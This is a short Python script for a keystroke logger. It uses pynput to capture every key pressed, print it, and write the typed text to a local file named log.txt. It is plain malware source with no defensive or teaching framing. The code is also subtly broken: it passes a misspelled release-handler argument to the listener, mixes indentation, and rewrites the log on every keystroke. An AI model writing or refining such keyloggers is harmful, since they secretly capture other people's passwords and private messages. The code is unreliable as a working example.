import pynput
from pynput.keyboard import Key, Listener
import os


class Keylogger():
	def __init__(self):
		self.count = 0
		self.keys = []

	def on_press(self, key):
		print(f"{key} press")
		self.keys.append(key)
		self.count += 1
		if self.count >= 10:
			self.write_f(self.keys)

	def on_relese(self, key):
		if key == Key.esc:
			return False


	def write_f(self, keys):
		with open("log.txt", "w" ,encoding= 'utf-8') as f:
			for key in self.keys:
				k = str(key).replace("'", "")
				if k.find("space") > 0:
                                        f.write(" ")
				elif k.find('Key') == -1:
					f.write(k)
				elif k.find('enter') > 0:
					f.write("\n")


if __name__ == '__main__':
	obj = Keylogger()
	with Listener(on_press = obj.on_press, on_relese = obj.on_relese) as listener:
		listener.join()

